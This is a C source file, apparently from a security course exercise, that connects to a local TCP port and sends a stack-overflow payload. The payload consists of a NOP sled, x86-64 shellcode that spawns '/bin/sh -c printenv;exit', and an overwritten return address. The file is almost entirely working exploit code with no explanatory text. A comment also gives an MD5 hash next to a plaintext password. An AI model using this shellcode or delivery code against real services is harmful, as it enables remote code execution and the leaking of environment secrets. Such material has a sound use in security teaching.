#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <netdb.h>

char inbuff[1024];

void DoAttack(int PortNo);
void Attack(FILE * outfile);

int main(int argc, char * argv[]){

    char * studStr, *portStr;
    int studLen, portLen;
    int studNo, portNo;
    int i;

    if (argc != 2){
        fprintf(stderr, "usage %s portno\n", argv[0]);
        exit(1);
    }

    portStr = argv[1];
    if ((portLen = strlen(portStr)) < 1){
        fprintf(stderr, "%s: port number must be 1 or more digits\n", argv[0]);
        exit(1);
    }
    for (i = 0; i < portLen; i++){
        if(!isdigit(portStr[i])){
            fprintf(stderr, "%s: port number must be all digits\n", argv[0]);
            exit(1);
        }
    }
    portNo = atoi(portStr);

    fprintf(stderr, "Port Number  %d\n", portNo);

    DoAttack(portNo);

    exit(0);
}

void  DoAttack(int portNo) {
    int server_sockfd;
    int serverlen;

    struct sockaddr_in server_address;

    FILE * outf;
    FILE * inf;
    struct hostent *h;


    server_sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if((h=gethostbyname("localhost"))==NULL){
        fprintf(stderr,"Host Name Error...");
        exit(1);
    }

    server_address.sin_family = AF_INET;
    memcpy((char *) &server_address.sin_addr.s_addr, h->h_addr_list[0], h->h_length);
    /* server_address.sin_addr.s_addr = htonl(INADDR_ANY); */
    server_address.sin_port = htons(portNo);

    if(connect(server_sockfd,(struct sockaddr*)&server_address,sizeof(struct sockaddr))==-1){
        fprintf(stderr,"Connection out...");
        exit(1);
    }

    outf = fdopen(server_sockfd, "w");

    // add log message here
    Attack(outf);

    inf = fdopen(server_sockfd, "r");
    if (inf == NULL){
        fprintf(stderr,"could not open socket for read");
        exit(1);
    }
    do {
        inbuff[0] = '\0';
        fgets(inbuff,1024,inf);
        if (inbuff[0]){
            fputs(inbuff,stdout);
        }
    } while (!feof(inf));
    fclose(outf);
    fclose(inf);
    return;
}

// Had to add more buffer values for the proper code to work.
char compromise[224]={

    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // 10
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // 20
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // 30
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // 40
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // 50
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // 60
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // 70
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // 80
    0x90, 0x90, 0x90, 0x90, 0x90,                               // 85

    0xEB, 0x52,
    0x5E,
    0X48, 0x31, 0xC0,
    0x88, 0x46, 0x07,
    0x88, 0x46, 0x0B,
    0x88, 0x46, 0x19, 
    0x48, 0x89, 0x46, 0x32,
    0x48, 0x89, 0x76, 0x1A,
    0x48, 0x8D, 0x7E, 0x09,
    0x48, 0x89, 0x7E, 0x22,
    0x48, 0x8D, 0x7E, 0x0C,
    0x48, 0x89, 0x7E, 0x2A,
    0xB0, 0x3B, 
    0x48, 0x89, 0xF7,
    0x48, 0x8D, 0x76, 0x1A,
    0x48, 0x89, 0xE2, 
    0x48, 0xC1, 0xEA, 0x20,
    0x48, 0xC1, 0xE2, 0x20,
    0xB9, 0xFF, 0xE6, 0xFB, 0xF7,
    0x30, 0xC9,
    0x48, 0x09, 0xCA,
    0x48, 0x8B, 0x12,
    0x0F, 0x05,
    0x48, 0x89, 0xC7,
    0x48, 0x31, 0xC0,
    0xB0, 0x3C,
    0x0F, 0x05,
    0xE8, 0xA9, 0xFF, 0xFF, 0xFF,
    0x2F, 0x62, 0x69, 0x6E, 0x2F, 0x73, 0x68, 0x58, 0x79,
    0x2D, 0x63, 0x58,
    0x70, 0x72, 0x69, 0x6E, 0x74, 0x65, 0x6E, 0x76, 0x3B, 0x65, 0x78, 0x69, 0x74, 0x58,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,

    0xF5, 0xDE, 0xFF, 0xFF,
    0xFF, 0x7F, 0x0A, 0x00

};

// MD5=c13d47bfb60f61fb5f0c9e4aaca3d244
// The password is "Burritos24"

char * compromise1=
    "xxxxxxxxxxxxxxxxxxxx" // 20
    "xxxxxxxxxxxxxxxxxxxx" // 40
    "xxxxxxxxxxxxxxxxxxxx" // 60
    "xxxxxxxxxxxxxxxxxxxx" // 80
    "xxxxxxxxxxxxxxxxxxxx" // 100
    "xxxxxxxxxxxxxxxxxxxx" // 120
    "xxxxxxxxxxxxxxxxxxxx" // 140
    "xxxxxxxxxxxxxxxxxxxx" // 160
    "xxxxxxxxxxxxxxxxxxxx" // 180
    "xxxxxxxxxxxxxxxxxxxx" // 200
    "xxxxxxxx"
    "MNOPWXYZ"
    "xxxxxxxx\n";

// change to write so we can write NULLs
void Attack(FILE * outfile){
    fprintf(outfile, "%s",compromise);  
    fflush(outfile);
}
